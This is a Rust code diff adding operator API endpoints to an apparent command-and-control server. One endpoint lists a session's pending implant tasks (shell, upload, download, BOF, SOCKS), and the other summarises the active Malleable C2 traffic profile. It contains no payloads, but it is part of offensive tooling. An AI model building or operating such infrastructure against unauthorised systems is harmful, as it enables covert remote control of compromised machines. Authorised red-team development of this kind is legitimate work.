@@ -202,7 +202,9 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/beacon", post(beacon))
         .route("/api/sessions", get(list_sessions))
         .route("/api/task", post(post_task))
-        .route("/api/results", get(get_results));
+        .route("/api/tasks", get(get_tasks))
+        .route("/api/results", get(get_results))
+        .route("/api/profile", get(get_profile));
     let mut seen = std::collections::HashSet::new();
     for uri in extra {
         if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
@@ -526,6 +528,91 @@ async fn get_results(
         })
         .collect();
     (StatusCode::OK, Json(views)).into_response()
+}
+
+/// Short name for a wire [`Command`] variant (for operator-facing views).
+fn command_name(c: &Command) -> &'static str {
+    match c {
+        Command::Ping => "ping",
+        Command::Sleep { .. } => "sleep",
+        Command::Shell { .. } => "shell",
+        Command::Upload { .. } => "upload",
+        Command::Download { .. } => "download",
+        Command::Bof { .. } => "bof",
+        Command::Connect { .. } => "connect",
+        Command::Socks { .. } => "socks",
+        Command::Exit => "exit",
+    }
+}
+
+#[derive(Serialize)]
+struct TaskView {
+    task_id: u64,
+    command: String,
+}
+
+/// `GET /api/tasks?session=<hex>` — the pending task queue for a session.
+async fn get_tasks(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Query(q): Query<ResultsQuery>,
+) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
+    let id = match parse_session_hex(&q.session) {
+        Some(id) => id,
+        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
+    };
+    let views: Vec<TaskView> = match st.sessions.get(&id) {
+        Some(s) => s
+            .pending
+            .iter()
+            .map(|t| TaskView {
+                task_id: t.task_id,
+                command: command_name(&t.command).to_string(),
+            })
+            .collect(),
+        None => Vec::new(),
+    };
+    Json(views).into_response()
+}
+
+#[derive(Serialize)]
+struct ProfileView {
+    loaded: bool,
+    http_get_uri: Option<String>,
+    http_post_uri: Option<String>,
+    useragent: Option<String>,
+}
+
+/// `GET /api/profile` — the active Malleable C2 profile summary (or `loaded:
+/// false`). Lets an operator / the Tauri client see what's shaping traffic.
+async fn get_profile(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
+    let view = ProfileView {
+        loaded: st.profile.is_some(),
+        http_get_uri: st
+            .profile
+            .as_ref()
+            .and_then(|p| p.http_get())
+            .and_then(|b| b.get("uri"))
+            .map(|u| u.as_str().into_owned()),
+        http_post_uri: st
+            .profile
+            .as_ref()
+            .and_then(|p| p.http_post())
+            .and_then(|b| b.get("uri"))
+            .map(|u| u.as_str().into_owned()),
+        useragent: st
+            .profile
+            .as_ref()
+            .and_then(|p| p.option("useragent"))
+            .map(|u| u.as_str().into_owned()),
+    };
+    Json(view).into_response()
 }
 
 #[cfg(test)]
